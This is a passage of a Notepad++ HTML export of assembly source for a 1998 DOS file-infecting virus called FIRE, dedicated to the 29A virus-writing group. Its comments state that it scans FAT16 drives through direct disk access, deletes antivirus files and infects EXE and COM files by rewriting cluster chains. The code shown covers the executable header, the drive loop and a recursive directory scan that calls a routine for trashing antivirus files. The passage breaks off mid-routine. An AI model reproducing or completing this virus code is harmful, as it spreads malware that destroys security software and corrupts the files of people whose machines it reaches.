<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; [FIRE]   FAT16 Independent Replicative Emulator   Copyright (c) 1998 Z0MBiE</span><span class="sc0">
</span><span class="sc1">; Release 1.00[BETA]   *** NOT FOR [RE]PUBLISHING IN VX-ZINES, EXCEPT 29A ***</span><span class="sc0">
</span><span class="sc1">; Thanx to S.S.R. &amp; LordASD              HomePage: http://www.chat.ru/~z0mbie</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                 THIS VIRUS TECHNOLOGY DEDICATED TO 29A GROUP</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                               *** Program ***</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   1. Using IDE IO-port access method find all physical IDE drives</span><span class="sc0">
</span><span class="sc1">;   2. For each physical drive find all logical disks with FAT16 system</span><span class="sc0">
</span><span class="sc1">;   3. For each logical disk scan directory tree with selected</span><span class="sc0">
</span><span class="sc1">;      max directory level</span><span class="sc0">
</span><span class="sc1">;   5. Delete all AV-files (by filemasks), including file name/cluster chain</span><span class="sc0">
</span><span class="sc1">;   6. Infect each EX?/CO? file (with selected min. size)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                           *** Infection Method ***</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   1. Allocate some free cluster(s) in the FAT</span><span class="sc0">
</span><span class="sc1">;   2. FAT.LastOurCluster &lt;- DirEntry.StartCluster</span><span class="sc0">
</span><span class="sc1">;   3. DirEntry.StartCluster &lt;- 1stOurCluster</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">DEBUG</span><span class="sc0">                   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">YES</span><span class="sc0">             </span><span class="sc1">; debug mode</span><span class="sc0">

                        </span><span class="sc9">IFDEF</span><span class="sc0">   </span><span class="sc5">DEBUG</span><span class="sc0">
</span><span class="sc5">START_DRIVE</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc12">'E'</span><span class="sc0">             </span><span class="sc1">; start scanning</span><span class="sc0">
                        </span><span class="sc9">ELSE</span><span class="sc0">                    </span><span class="sc1">; from logical drive</span><span class="sc0">
</span><span class="sc5">START_DRIVE</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc12">'C'</span><span class="sc0">
                        </span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc5">virsize</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">16384</span><span class="sc0">           </span><span class="sc1">; total virus size</span><span class="sc0">

</span><span class="sc5">o</span><span class="sc0">                       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; to access DWORDs</span><span class="sc0">
</span><span class="sc5">s</span><span class="sc0">                       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">exe_struc</span><span class="sc0">               </span><span class="sc9">struc</span><span class="sc0">                   </span><span class="sc1">; dos exe header</span><span class="sc0">
</span><span class="sc5">exe_mz</span><span class="sc0">                  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; MZ/ZM</span><span class="sc0">
</span><span class="sc5">exe_last512</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">exe_num512</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">exe_relnum</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">exe_headersize</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; in PAR</span><span class="sc0">
</span><span class="sc5">exe_minmem</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">exe_maxmem</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">exe_ss</span><span class="sc0">                  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">exe_sp</span><span class="sc0">                  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">exe_checksum</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; 0</span><span class="sc0">
</span><span class="sc5">exe_ip</span><span class="sc0">                  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">exe_cs</span><span class="sc0">                  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">exe_relofs</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">exe_ovrnum</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; 0</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">exe_neptr</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc9">ends</span><span class="sc0">

                        </span><span class="sc5">model</span><span class="sc0">   </span><span class="sc10">tiny</span><span class="sc0">            </span><span class="sc1">; header</span><span class="sc0">
                        </span><span class="sc5">p386</span><span class="sc0">
                        </span><span class="sc5">jumps</span><span class="sc0">
                        </span><span class="sc5">locals</span><span class="sc0">  </span><span class="sc5">__</span><span class="sc0">

</span><span class="sc5">code</span><span class="sc0">                    </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc9">use16</span><span class="sc1">;code segment</span><span class="sc0">
                        </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">

                        </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">virus</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'MZ'</span><span class="sc0">            </span><span class="sc1">; lets generate .exe program</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">virsize</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">virmemory</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">virmemory</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0fff0h</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">exe_endofstack</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">exe_entrypoint</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0fff0h</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">40h</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">C_INFECTED_ID</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1234h</span><span class="sc0">           </span><span class="sc1">; infected file ID</span><span class="sc0">
</span><span class="sc5">infected_id</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">C_INFECTED_ID</span><span class="sc0">

</span><span class="sc5">FTYPE</span><span class="sc0">                   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">exe_entrypoint</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1600h</span><span class="sc0">       </span><span class="sc1">; windows :-?</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2fh</span><span class="sc0">

                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; dos</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">DOS_START</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">           </span><span class="sc1">; win95...</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">WIN4_START</span><span class="sc0">

                        </span><span class="sc1">; win3, etc.</span><span class="sc0">

</span><span class="sc5">EXIT</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4c00h</span><span class="sc0">       </span><span class="sc1">; exit to DOS</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">WIN4_START</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">EXIT</span><span class="sc0">            </span><span class="sc1">; not implemented yet</span><span class="sc0">

</span><span class="sc5">win_msg</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'This program requires Microsoft Windows.'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">

</span><span class="sc5">DOS_START</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">           </span><span class="sc1">; fucking message</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">win_msg</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                        </span><span class="sc9">IFDEF</span><span class="sc0">   </span><span class="sc5">DEBUG</span><span class="sc0">           </span><span class="sc1">; initialize PUTCHAR</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">putchar_ptr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dos_putchar</span><span class="sc0">
                        </span><span class="sc9">ENDIF</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dos_alloc</span><span class="sc0">       </span><span class="sc1">; allocate memory (dos)</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">EXIT</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">main</span><span class="sc0">            </span><span class="sc1">; main subprogram</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dos_dealloc</span><span class="sc0">     </span><span class="sc1">; deallocate memory</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">EXIT</span><span class="sc0">            </span><span class="sc1">; exit</span><span class="sc0">

</span><span class="sc5">main</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">level0_drive</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; scan HD: 0,1,2,3</span><span class="sc0">
</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">process_0</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc5">level0_drive</span><span class="sc0">    </span><span class="sc1">; bit0 = master/slave</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">level0_drive</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">; bit1 = primary/secondary</span><span class="sc0">
                        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">__1</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">process_0</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">level0_init</span><span class="sc0">     </span><span class="sc1">; initialize hardware</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">__exit</span><span class="sc0">

                        </span><span class="sc9">IFDEF</span><span class="sc0">   </span><span class="sc5">DEBUG</span><span class="sc0">           </span><span class="sc1">; fucking message</span><span class="sc0">
                        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">level0_drive</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'0'</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">printf</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Processing physical drive %c\n$'</span><span class="sc0">
                        </span><span class="sc9">ENDIF</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">level2_init</span><span class="sc0">     </span><span class="sc1">; recursive scan for logical</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">__exit</span><span class="sc0">          </span><span class="sc1">; disks</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">START_DRIVE</span><span class="sc4">-</span><span class="sc12">'C'</span><span class="sc0">    </span><span class="sc1">; start drive</span><span class="sc0">

</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">level2_drivecount</span><span class="sc0">  </span><span class="sc1">; cycle</span><span class="sc0">
                        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">__exit</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">

                        </span><span class="sc9">IFDEF</span><span class="sc0">   </span><span class="sc5">DEBUG</span><span class="sc0">           </span><span class="sc1">; fucking message</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'C'</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">printf</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Processing logical drive %c:\n$'</span><span class="sc0">
                        </span><span class="sc9">ENDIF</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">level2_drive</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">  </span><span class="sc1">; initialize "basesector"</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">level2_initdrive</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">level3_init</span><span class="sc0">       </span><span class="sc1">; initialize level3-access</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">__2</span><span class="sc0">

                        </span><span class="sc9">IFDEF</span><span class="sc0">   </span><span class="sc5">DEBUG</span><span class="sc0">           </span><span class="sc1">; fucking message</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">printf</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Compatibility test done\n$'</span><span class="sc0">
                        </span><span class="sc9">ENDIF</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rulez_forever</span><span class="sc0">   </span><span class="sc1">; best subprogram in the world</span><span class="sc0">

</span><span class="sc5">__2</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc9">IFDEF</span><span class="sc0">   </span><span class="sc5">DEBUG</span><span class="sc0">           </span><span class="sc1">; fucking message</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">printf</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Drive processed\n$'</span><span class="sc0">
                        </span><span class="sc9">ENDIF</span><span class="sc0">

                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">              </span><span class="sc1">; end of cycle</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__1</span><span class="sc0">

</span><span class="sc5">__exit</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><span class="sc0">

                        </span><span class="sc1">; recursive scan directory tree</span><span class="sc0">

</span><span class="sc5">rulez_forever</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc9">IFDEF</span><span class="sc0">   </span><span class="sc5">DEBUG</span><span class="sc0">           </span><span class="sc1">; fucking message</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">printf</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Executing RULEZ_FOREVER\n$'</span><span class="sc0">
                        </span><span class="sc9">ENDIF</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">_rec</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; recurse level</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ROOT</span><span class="sc0">        </span><span class="sc1">; start from ROOT directory</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">process_dir</span><span class="sc0">

                        </span><span class="sc9">IFDEF</span><span class="sc0">   </span><span class="sc5">DEBUG</span><span class="sc0">           </span><span class="sc1">; fucking message</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">printf</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'RULEZ_FOREVER Executed\n$'</span><span class="sc0">
                        </span><span class="sc9">ENDIF</span><span class="sc0">

                        </span><span class="sc6">ret</span><span class="sc0">

                        </span><span class="sc1">; this is recursive subprogram</span><span class="sc0">

</span><span class="sc5">process_dir</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc9">IFDEF</span><span class="sc0">   </span><span class="sc5">DEBUG</span><span class="sc0">           </span><span class="sc1">; fucking message</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">_rec</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">printf</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Executing PROCESS_DIR [cluster %iw04h0], RECURSIVE %iw00d\n$'</span><span class="sc0">
                        </span><span class="sc9">ENDIF</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__read</span><span class="sc0">          </span><span class="sc1">; read directory cluster (bp)</span><span class="sc0">

                        </span><span class="sc6">lgs</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dir_ptr</span><span class="sc0">     </span><span class="sc1">; gs:si = directory cluster</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">level3_sectpercluster</span><span class="sc0">  </span><span class="sc1">; cx=#direntries</span><span class="sc0">
                        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">__cycle</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc1">; check for valid filename</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">gs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.direntry_name</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">char_DELETED</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__cont</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">gs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.direntry_name</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">char_NOFILE</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__exit</span><span class="sc0">

                        </span><span class="sc1">; check for AV filename, CF=1 - file is fucked</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TRY_TO_FUCK_FILE</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">__cont</span><span class="sc0">

                        </span><span class="sc1">; zero-length file or directory link to ROOT</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">gs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.direntry_cluster</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; zero-file</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__cont</span><span class="sc0">

                        </span><span class="sc1">; file attribute</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">gs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.direntry_attr</span><span class="sc0">

                        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fa_volumeid</span><span class="sc0">   </span><span class="sc1">;  volumeid, long-filename</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__cont</span><span class="sc0">

                        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fa_directory</span><span class="sc0">  </span><span class="sc1">; directory?</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__directory</span><span class="sc0">

                        </span><span class="sc1">; yes! file!</span><span class="sc0">

</span><span class="sc5">MINSIZE</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1024</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">gs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.direntry_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MINSIZE</span><span class="sc0"> </span><span class="sc1">; check size</span><span class="sc0">
                        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">__cont</span><span class="sc0">

                        </span><span class="sc1">; normal attributes?</span><span class="sc0">
                        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">fa_archive</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">fa_hidden</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">fa_system</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">fa_readonly</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__file</span><span class="sc0">

</span><span class="sc5">__cont</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0">    </span><span class="sc1">; cycle</span><span class="sc0">
                        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__cycle</span><span class="sc0">

                        </span><span class="sc1">; flush directory cluster if modified</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TRY_TO_FLUSH_DIR_CACHE</span><span class="sc0">

                        </span><span class="sc1">; root? - exit!</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ROOT</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__exit</span><span class="sc0">

                        </span><span class="sc1">; READ NEXT DIRECTORY CLUSTER</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">  </span><span class="sc1">; get nextcluster value</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">level3_cluster_get</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">EOF</span><span class="sc0"> </span><span class="sc1">; end of directory?</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__exit</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">; process next dircluster</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">process_dir</span><span class="sc0">

